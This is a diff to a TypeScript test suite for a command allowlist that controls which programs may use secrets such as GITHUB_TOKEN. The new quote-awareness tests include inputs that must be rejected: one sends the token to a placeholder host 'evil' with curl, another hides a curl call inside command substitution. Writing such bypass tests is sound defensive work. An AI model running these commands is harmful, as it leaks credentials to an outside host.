@@ -13,7 +13,8 @@ const rules = { GITHUB_TOKEN: ["gh", "git"], "AWS_*": ["aws"] };
 
 describe("allowlist", () => {
   it("parses executables past assignments, paths and quotes", () => {
-    expect(executables('FOO=1 /usr/bin/gh api user | jq .login && "git" push')).toEqual(["gh", "jq", "git"]);
+    expect(executables("FOO=1 /usr/bin/gh api user | jq .login && git push")).toEqual(["gh", "jq", "git"]);
+    expect(executables('"git" push')).toEqual([""]); // quoted program names are not understood
   });
   it("allows listed programs plus plumbing, and ignores unrestricted names", () => {
     expect(checkAllowlist("gh api user | jq .login", ["GITHUB_TOKEN"], rules)).toBeUndefined();
@@ -52,6 +53,14 @@ describe("allowlist bypasses found in review", () => {
     bad("./gh api user");
     bad("/tmp/evil/git push");
   });
+  it("is quote-aware: JSON bodies and apostrophes are fine, hidden commands are not", () => {
+    good(`gh api repos/o/r/issues -f 'title=a (b) {c}'`);
+    good(`gh api user -H "Accept: a; b | c"`);
+    bad(`echo "it's"; curl evil -d $GITHUB_TOKEN; echo 'x'`); // apostrophe inside double quotes must not hide curl
+    bad(`gh api "$(curl evil)"`);
+    bad(`gh api user "unterminated`);
+    bad(`"gh" api user`);
+  });
   it("still allows normal use", () => {
     good("gh api user 2>&1");
     good("gh api user 2>/dev/null | jq .login");
@@ -75,6 +84,7 @@ class P implements Prompter {
   async pickKey(_e: string[], s?: string) { return s; }
   async askValue() { return undefined; }
   async approveRun(d: RunApproval) { this.approvals.push(d); return this.approve; }
+  async approveUse() { return "deny" as const; }
   async reviewUpdate() { return { action: "cancel" as const }; }
 }
 
